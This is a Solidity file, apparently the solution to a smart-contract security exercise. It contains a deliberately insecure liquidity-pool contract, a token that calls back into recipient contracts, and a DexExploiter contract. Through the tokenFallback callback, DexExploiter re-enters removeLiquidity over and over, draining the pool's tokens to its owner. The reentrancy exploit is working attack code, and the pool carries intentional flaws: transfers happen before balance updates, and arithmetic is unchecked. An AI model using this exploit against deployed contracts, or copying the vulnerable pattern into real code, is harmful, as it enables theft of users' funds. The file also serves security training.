// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

contract DexExploiter{
    using SafeERC20 for IERC20;

    //bytes are being counted here to monitor storage slots. One slot = 32 bytes.
    IERC20 token0;     //32 bytes
    IERC20 token1;   //32 bytes
    InsecureDexLP dex;          //32 bytes
    address owner;              //32 bytes
    uint totalBalanceTaken; // 32 bytes
    bool running; // reentrancy attack active status.



    constructor(IERC20 _token0, IERC20 _token1, InsecureDexLP _dex){
        token0 = _token0;
        token1 = _token1;
        dex = _dex;
        owner = msg.sender;
        running = false;
    }

    modifier onlyOwner(){
        require(msg.sender == owner, 'Not owner');
        _;
    }
    function startRunnig() external onlyOwner{
        running = true;
    }

    function  allowances()  external onlyOwner{
        token0.approve(address(dex), 1000000000000000000);
        token1.approve(address(dex), 1000000000000000000);
    }

    function  addLiquidity() external onlyOwner{
        dex.addLiquidity(1000000000000000000, 1000000000000000000);
    }

    function  removeLiquidity() external onlyOwner{
        dex.removeLiquidity(1000000000000000000);
    }




    function withdraw() public  {
        
        
        token0.transfer(owner, 1000000000000000000);
        token1.transfer(owner, 1000000000000000000);
    }



    function tokenFallback(address, uint256, bytes memory) public returns (bool success, bytes memory result) {

        if(totalBalanceTaken < 9000000000000000000 && running){
            totalBalanceTaken += 1000000000000000000;
            dex.removeLiquidity(1000000000000000000);
        } else if (totalBalanceTaken == 9000000000000000000 && running){
            running = false;
            withdraw();
            
        }
        success = true;
        result = "";

    }
}

contract InsecureDexLP {

    using SafeERC20 for IERC20;

    IERC20 public immutable token0;
    IERC20 public immutable token1;

    // @dev Balance of token0
    uint256 public reserve0;
    // @dev Balance of token1
    uint256 public reserve1;

    // @dev Total liquidity LP
    uint256 public totalSupply;
    // @dev Liquidity shares per user
    mapping(address => uint256) private _balances;

    /* @dev token0Address, token1Address Addresses of the tokens
     * participating in the liquidity pool 
     */
    constructor(address token0Address, address token1Address) {
        token0 = IERC20(token0Address);
        token1 = IERC20(token1Address);
    }

    // @dev Updates the balances of the tokens
    function _updateReserves() internal {
        reserve0 = token0.balanceOf(address(this));
        reserve1 = token1.balanceOf(address(this));
    }

    // @dev Allows users to add liquidity for token0 and token1
    function addLiquidity(uint256 amount0, uint256 amount1) external {
        uint liquidity;

        token0.safeTransferFrom(msg.sender, address(this), amount0);
        token1.safeTransferFrom(msg.sender, address(this), amount1);

        uint256 _totalSupply = totalSupply;

        /* @dev if there is no liquidity, initial liquidity is defined as
         * sqrt(amount0 * amount1), following the product-constant rule
         * for AMMs.
         */
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount1);
        // @dev If liquidity exists, update shares with supplied amounts
        } else {
            liquidity = Math.min((amount0 * _totalSupply) / reserve0, (amount1 *_totalSupply) / reserve1);
        }

        // @dev Update balances with the new values
        _updateReserves();
        // @dev Increase total supply and user balance accordingly
        unchecked {
            totalSupply += liquidity;
            _balances[msg.sender] += liquidity;
        }
    }

    // @dev Burn LP shares and get token0 and token1 amounts back
    function removeLiquidity(uint256 amount) external returns (uint amount0, uint amount1) {
        require(_balances[msg.sender] >= amount);
        unchecked {
            amount0 = (amount * reserve0) / totalSupply;
            amount1 = (amount * reserve1) / totalSupply;
        }
        require(amount0 > 0 && amount1 > 0, 'InsecureDexLP: INSUFFICIENT_LIQUIDITY_BURNED');
        
        token0.safeTransfer(msg.sender, amount0);
        token1.safeTransfer(msg.sender, amount1);
        
        unchecked {
            _balances[msg.sender] -= amount;
            totalSupply -= amount;
        }
        
        _updateReserves();
    }

    // @dev Swap amountIn of tokenFrom to tokenTo
    function swap(address tokenFrom, address tokenTo, uint256 amountIn) external returns(uint256 amountOut) {
        require(tokenFrom == address(token0) || tokenFrom == address(token1), "tokenFrom is not supported");
        require(tokenTo == address(token0) || tokenTo == address(token1), "tokenTo is not supported");

        if (tokenFrom == address(token0)) {
            amountOut = _calcAmountsOut(amountIn, reserve0, reserve1);
            token0.safeTransferFrom(msg.sender, address(this), amountIn);
            token1.safeTransfer(msg.sender, amountOut);
        } else {
            amountOut = _calcAmountsOut(amountIn, reserve1, reserve0);
            token1.safeTransferFrom(msg.sender, address(this), amountIn);
            token0.safeTransfer(msg.sender, amountOut);
        }
        _updateReserves();
    }

    /* @dev Given an amountIn of tokenIn, compute the corresponding output of
     * tokenOut
     */
    function calcAmountsOut(address tokenIn, uint256 amountIn) external view returns(uint256 output) {
        if (tokenIn == address(token0)) {
            output = _calcAmountsOut(amountIn, reserve0, reserve1);
        } else if (tokenIn == address(token1)) {
            output = _calcAmountsOut(amountIn, reserve1, reserve0);
        } else {
            revert('Token is not supported');
        }
    }

    // @dev See balance of user
    function balanceOf(address user) external view returns(uint256) {
        return _balances[user];
    }

    /* @dev taken from uniswap library;
     * https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol#L43
     */
    function _calcAmountsOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns(uint256 amountOut) {
        amountIn = amountIn * 1000;
        uint numerator = amountIn * reserveOut;
        uint denominator = reserveIn * 1000 + amountIn;
        amountOut = (numerator / denominator);
    }

    function tokenFallback(address, uint256, bytes memory) external {

    }
}

contract InSecureumToken is ERC20 {

    // Decimals are set to 18 by default in `ERC20`
    constructor(uint256 _supply) ERC20("InSecureumToken", "ISEC") {
        _mint(msg.sender, _supply);
    }

}


contract SimpleERC223Token is ERC20 {
    constructor(uint256 _supply) ERC20("Simple ERC223 Token", "SET") { 
        _mint(msg.sender, _supply);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        // Call parent hook
        super._afterTokenTransfer(from, to, amount);
        if (Address.isContract(to)) {
            // this is wrong and broken on many ways, but it works for this example
            // instead of a try catch perhaps we should use a ERC165...
            // the tokenFallback function is run if the contract has this function
            (bool success, bytes memory result) = to.call(abi.encodeWithSignature("tokenFallback(address,uint256,bytes)", msg.sender, amount, ""));
            require(success, 'TokenFallback not implemented');
        }
    }
}
